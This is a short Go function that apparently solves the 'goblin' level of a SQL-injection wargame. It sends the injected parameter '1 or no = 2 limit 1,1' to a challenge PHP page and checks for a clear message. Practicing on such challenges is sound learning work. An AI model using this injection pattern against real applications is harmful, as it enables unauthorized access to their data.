package problem

import (
	"fmt"
	"strings"
)

func Goblin(session string){
	file := "goblin_d71b2f3194f84866a74667dd2a62991f.php"
	param := map[string]string{
		"no" : "1 or no = 2 limit 1,1",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"GOBLIN Clear!"){
		fmt.Println("GOBLIN Clear!")
	}
}
